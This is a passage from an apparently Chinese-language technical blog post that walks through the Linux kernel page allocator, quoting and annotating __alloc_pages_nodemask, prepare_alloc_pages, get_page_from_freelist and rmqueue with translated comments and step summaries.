&amp;alloc_mask, &amp;alloc_flags))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 直到所有的 local zone 都被考虑之前，</span></span><br><span class="line"><span class="comment"> * 禁止从 falling back 到内存碎片种类的第一次传递</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第一次分配尝试 */</span></span><br><span class="line">page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);</span><br><span class="line"><span class="keyword">if</span> (likely(page))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 应用作用域分配约束 这主要与 GFP_NOFS 有关。</span></span><br><span class="line"><span class="comment"> * GFP_NOIO 必须从一个特定的由 memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;</span></span><br><span class="line"><span class="comment"> * 所标记的上下文中所有的分配请求中继承</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alloc_mask = current_gfp_context(gfp_mask);</span><br><span class="line">ac.spread_dirty_pages = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 恢复最初的 nodemask （其可能被替换为 &amp;cpuset_current_mems_allowed</span></span><br><span class="line"><span class="comment"> * 以优化快速（分配）路径的尝试）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac.nodemask = nodemask;</span><br><span class="line"></span><br><span class="line">page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;</span><br><span class="line">    unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != <span class="number">0</span>)) &#123;</span><br><span class="line">__free_pages(page, order);</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(__alloc_pages_nodemask);</span><br></pre></td></tr></table></figure><p>这个函数的具体步骤主要分为三步：</p><ul><li>检查参数合法性，并做分配前准备工作</li><li>进行<strong>快速分配</strong>，成功则直接返回结果</li><li>若快速分配失败，则进行<strong>慢速分配</strong></li></ul><p>接下来我们来深入快速分配与慢速分配的内部细节</p><h3 id="I-prepare-alloc-pages-：分配前的准备工作"><a href="#I-prepare-alloc-pages-：分配前的准备工作" class="headerlink" title="I. prepare_alloc_pages()：分配前的准备工作"></a>I. prepare_alloc_pages()：分配前的准备工作</h3><p>这个函数比较简单，主要是做分配前的一些准备的工作，包括初始化 <code>alloc_context</code> 结构体、获取 zone 数组等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">prepare_alloc_pages</span><span class="params">(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order,</span></span><br><span class="line"><span class="params"><span class="type">int</span> preferred_nid, <span class="type">nodemask_t</span> *nodemask,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> alloc_context *ac, <span class="type">gfp_t</span> *alloc_mask,</span></span><br><span class="line"><span class="params"><span class="type">unsigned</span> <span class="type">int</span> *alloc_flags)</span></span><br><span class="line">&#123;</span><br><span class="line">ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);</span><br><span class="line">ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask); <span class="comment">// 获取 zonelist</span></span><br><span class="line">ac-&gt;nodemask = nodemask;</span><br><span class="line">ac-&gt;migratetype = gfp_migratetype(gfp_mask);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若开启了 cpuset（限制某一组进程只运行在某些cpu和内存节点上），则设置对应的标志位。</span></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled()) &#123;</span><br><span class="line">*alloc_mask |= __GFP_HARDWALL;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若我们在中断上下文中, 则这与当前进程上下文无关。</span></span><br><span class="line"><span class="comment"> * 这意味着任一 node 都是 ok 的.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!in_interrupt() &amp;&amp; !ac-&gt;nodemask)</span><br><span class="line">ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">*alloc_flags |= ALLOC_CPUSET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fs_reclaim_acquire(gfp_mask);</span><br><span class="line">fs_reclaim_release(gfp_mask);</span><br><span class="line"></span><br><span class="line">might_sleep_if(gfp_mask &amp; __GFP_DIRECT_RECLAIM);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_fail_alloc_page(gfp_mask, order))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">*alloc_flags = current_alloc_flags(gfp_mask, *alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Dirty zone 的平衡仅在 fast path 中完成 */</span></span><br><span class="line">ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * preferred zone 被用于进行数据统计， 但非常重要的是其页被用作</span></span><br><span class="line"><span class="comment"> * zonelist 迭代器的起始点. 对于忽略内存策略的分配，其可能会被重置。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>首先调用 <code>node_zonelist()</code> 从 <code>preferred_nid</code> 参数所指定的 node 中获取一个 zonelist，其实就是取 <code>pglist_data-&gt;node_zonelists[gfp_zonelist(flags)]</code></li><li>进行 cpuset 相关判断与标志位设置，若是在中断上下文则直接将 nodemask 设为 <code>cpuset_current_mems_allowed</code></li><li>最后调用 <code>first_zones_zonelist()</code> 设置 preferred zone，大概是在 zonelist 中→nodemask 所包含的 zone 中→ <code>highest_zoneidx</code> 以下的第一个 zone</li></ul><blockquote><p>反正源码注释是这么写的hhh</p></blockquote><h3 id="II-get-page-from-freelist-：快速分配路径（核心分配函数）"><a href="#II-get-page-from-freelist-：快速分配路径（核心分配函数）" class="headerlink" title="II. get_page_from_freelist()：快速分配路径（核心分配函数）"></a>II. get_page_from_freelist()：快速分配路径（核心分配函数）</h3><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要是遍历分配上下文对应的 zonelist 中的 zone 进行内存分配，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * get_page_from_freelist 遍历 zonelist 尝试分配页面</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> page *</span><br><span class="line"><span class="title function_">get_page_from_freelist</span><span class="params">(<span class="type">gfp_t</span> gfp_mask, <span class="type">unsigned</span> <span class="type">int</span> order, <span class="type">int</span> alloc_flags,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="keyword">struct</span> alloc_context *ac)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">z</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> *<span class="title">last_pgdat_dirty_limit</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">bool</span> no_fallback;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 扫描 zonelist, 寻找有着足够空闲页面的 zone.</span></span><br><span class="line"><span class="comment"> * 参见 __cpuset_node_allowed() 的注释（kernel/cpuset.c）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT; <span class="comment">// 避免内存碎片的flag</span></span><br><span class="line">z = ac-&gt;preferred_zoneref; <span class="comment">// 先尝试从 preferred zone 中分配</span></span><br><span class="line">    <span class="comment">// 这是一个封装宏，表示从 z 开始遍历 zonelist 中的 zoneref 数组，</span></span><br><span class="line">    <span class="comment">// 其核心是单次迭代调用 next_zones_zonelist()，该函数返回:</span></span><br><span class="line">    <span class="comment">// 在 nodemask 的 zone 中，以当前 zone 作为起点游标的</span></span><br><span class="line">    <span class="comment">// 【位于或低于】highest_zoneidx 的下一个 zone</span></span><br><span class="line">for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,</span><br><span class="line">ac-&gt;nodemask) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mark;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开启了 cpuset 且 flag 中有 ALLOC_CPUSET 标志位，</span></span><br><span class="line">        <span class="comment">// 但是 cpuset 中不允许以该 gfp_mask 在该 zone 中分配，</span></span><br><span class="line">        <span class="comment">// 进行下一次迭代</span></span><br><span class="line"><span class="keyword">if</span> (cpusets_enabled() &amp;&amp;</span><br><span class="line">(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;</span><br><span class="line">!__cpuset_zone_allowed(zone, gfp_mask))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在分配页缓存（page cache）页以进行写入时, 我们想要</span></span><br><span class="line"><span class="comment"> * 在一个节点的“脏限制”（dirty limit）内获得他, </span></span><br><span class="line"><span class="comment">         * 由此，没有一个节点有着超过全局允许的脏页比例。</span></span><br><span class="line"><span class="comment"> * 脏限制考虑了节点的低端内存保留和高水位线，</span></span><br><span class="line"><span class="comment"> * 以便于 kswapd 能平衡它，而不必从其 LRU 列表中写入页面。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">XXX:</span> 现在, 在进入回收之前，</span></span><br><span class="line"><span class="comment"> * 允许分配可能超过 慢速路径中 (spread_dirty_pages unset)</span></span><br><span class="line"><span class="comment"> * 单节点的 dirty limit，这在一个允许节点们在一起都未够大以达到全局限制</span></span><br><span class="line"><span class="comment">         * 的 NUMA 设置中是很重要的。对于这些情况的合适的修补将需要对</span></span><br><span class="line"><span class="comment"> * dirty-throttling 与 flusher threads 中节点的意识.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// 译注：原文就是XXX，笔者也不知道这个XXX是什么...</span></span><br><span class="line">        <span class="comment">// 大概就是检查当前zone对应node的脏页数量是不是达到限制了</span></span><br><span class="line"><span class="keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;</span><br><span class="line"><span class="keyword">if</span> (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;</span><br><span class="line">last_pgdat_dirty_limit = zone-&gt;zone_pgdat;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// node 数量大于1，且当前 zone 并非 preferred zone</span></span><br><span class="line"><span class="keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="number">1</span> &amp;&amp;</span><br><span class="line">    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;</span><br><span class="line"><span class="type">int</span> local_nid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若移动到了 remote node（译注：非当前node？）, 则重试，</span></span><br><span class="line"><span class="comment"> * 但允许 fragmenting fallbacks. 局部性比避免碎片更加重要。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">            <span class="comment">// 比对当前 zone 是否在 local node（就是离当前CPU最近那个 node）</span></span><br><span class="line">            <span class="comment">// 若否，则去掉 ALLOC_NOFRAGMENT 标志位，并从 preferred zone 开始重试。</span></span><br><span class="line">            <span class="comment">// 即：kernel 更倾向于优先从 local zone 进行分配，哪怕会产生内存碎片</span></span><br><span class="line">local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);</span><br><span class="line"><span class="keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取当前 zone 的水位线标记</span></span><br><span class="line">mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);</span><br><span class="line"><span class="keyword">if</span> (!zone_watermark_fast(zone, order, mark,</span><br><span class="line">       ac-&gt;highest_zoneidx, alloc_flags,</span><br><span class="line">       gfp_mask)) &#123; <span class="comment">// 水位线相关操作</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 该 zone 的水位线失败, 但若其包含了 deferred pages，</span></span><br><span class="line"><span class="comment"> * 则我们会看该 zone 是否还能再进行扩展</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Checked here to keep the fast path fast */</span></span><br><span class="line">BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);</span><br><span class="line">            <span class="comment">// 该标志位意为【不检查水位线】，此时我们直接尝试从该 zone 中分配</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node_reclaim_mode == <span class="number">0</span> ||</span><br><span class="line">    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 首先进行页面回收，之后查看是否满足水位线要求，若‘</span></span><br><span class="line">            <span class="comment">// 不扫描/没有可回收/检查未通过</span></span><br><span class="line">            <span class="comment">// 则都会进行下一次迭代，尝试下一个 zone</span></span><br><span class="line">ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);</span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_NOSCAN:</span><br><span class="line"><span class="comment">/* 不扫描 */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_FULL:</span><br><span class="line"><span class="comment">/* 扫描了但不可回收 */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">/* 检查我们是否回收了足够页面 */</span></span><br><span class="line"><span class="keyword">if</span> (zone_watermark_ok(zone, order, mark,</span><br><span class="line">ac-&gt;highest_zoneidx, alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_this_zone:</span><br><span class="line">        <span class="comment">// 来到该 label 表示我们终于通过了前面一系列的各种检查，现在开始正式进行页面分配</span></span><br><span class="line">        <span class="comment">// **************************</span></span><br><span class="line">        <span class="comment">// rmqueue() 即为我们在OS教科书上看到的的 buddy system 模型,</span></span><br><span class="line">        <span class="comment">// 取 freelist 对应下标 page，若无则向上遍历拆更高 order 的 page</span></span><br><span class="line">        <span class="comment">// **************************</span></span><br><span class="line">page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,</span><br><span class="line">gfp_mask, alloc_flags, ac-&gt;migratetype);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">prep_new_page(page, order, gfp_mask, alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 若这是一个高阶的原子分配，</span></span><br><span class="line"><span class="comment"> * 检查我们是否该为将来保留 pageblock</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))</span><br><span class="line">reserve_highatomic_pageblock(page, zone, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;<span class="comment">// 取到了，返回</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;<span class="comment">// 没取到</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/* 若该 zone 有 deferred pages，再试一遍 */</span></span><br><span class="line"><span class="keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 在一台 UMA 机器上可能所以的 zone 都是破碎的，</span></span><br><span class="line"><span class="comment"> * 若避免碎片, 重置并重试.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (no_fallback) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数流程总结如下：</p><ul><li><p><code>for_next_zone_zonelist_nodemask</code> 迭代遍历分配上下文中 zonelist 中的 zoneref 数组 对应的 zone</p><blockquote><p>其核心是单次迭代调用 next_zones_zonelist()，该函数返回:</p><ul><li>在 nodemask 的 zone 中，以当前 zone 作为起点游标的【位于或低于】highest_zoneidx 的下一个 zone</li></ul></blockquote><ul><li><p>若开启了 cpuset，检查当前 zone 是否满足 cpuset 的要求，若否，则尝试下一个 zone</p></li><li><p>检查当前 zone 对应 node 的脏页数量是否超出限制，若否，则尝试下一个 zone</p></li><li><p>若 <code>ALLOC_NOFRAGMENT</code> 但是当前 zone 非 preferred zone、且对应 node 为 remote node，则清除该标志位后<strong>重新开始分配</strong>，因为 locality 比避免碎片更加重要</p></li><li><p>获取当前 zone 的水位线标记</p><ul><li>若是设置了 <code>ALLOC_NO_WATERMARKS</code> 则直接到下一步进行分配</li><li>若水位线检查未通过，调用 <code>node_reclaim()</code> 进行页面回收</li><li>若回收后页面还是不足，则尝试下一个 zone</li></ul></li><li><p>调用 <code>rmqueue()</code> 正式进行内存分配，该函数即为 buddy system 分配算法</p></li></ul></li></ul><p><img src="https://s2.loli.net/2022/07/05/SJMKys31ofnTPXc.png" alt="偷的图.png"></p><h4 id="rmqueue-：从给定的-page-中进行页面分配"><a href="#rmqueue-：从给定的-page-中进行页面分配" class="headerlink" title="rmqueue()：从给定的 page 中进行页面分配"></a>rmqueue()：从给定的 page 中进行页面分配</h4><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要是从给定 zone 中进行内存分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 从给定 zone 中进行内存分配. 对于 order-0 的分配则使用 pcplists.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span></span><br><span class="line"><span class="keyword">struct</span> page *<span class="title function_">rmqueue</span><span class="params">(<span class="keyword">struct</span> zone *preferred_zone,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> zone *zone, <span class="type">unsigned</span> <span class="type">int</span> order,</span></span><br><span class="line"><span class="params"><span class="type">gfp_t</span> gfp_flags, <span class="type">unsigned</span> <span class="type">int</span> alloc_flags,</span></span><br><span class="line"><span class="params"><span class="type">int</span> migratetype)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(order == <span class="number">0</span>)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_MOVABLE 的 pcplist 可能在 CMA 区域有着页面，</span></span><br><span class="line"><span class="comment"> * 当从 CMA 的分配不被允许时我们需要略过它</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">// 对于 order-0 的分配，</span></span><br><span class="line">        <span class="comment">// 若没有开启 CMA | 设置了 ALLOC_CMA | 迁移类型非 MIGRATE_MOVABLE</span></span><br><span class="line">        <span class="comment">// 则先从 pcplist 上分配</span></span><br><span class="line"><span class="keyword">if</span> (!IS_ENABLED(CONFIG_CMA) || alloc_flags &amp; ALLOC_CMA ||</span><br><span class="line">migratetype != MIGRATE_MOVABLE) &#123;</span><br><span class="line">page = rmqueue_pcplist(preferred_zone, zone, gfp_flags,</span><br><span class="line">migratetype, alloc_flags);</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 我们绝不希望 callers 尝试</span></span><br><span class="line"><span class="comment"> * 在带有 __GFP_NOFAIL 时分配大于 order-1 的页</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="number">1</span>));</span><br><span class="line">spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"></span><br><span 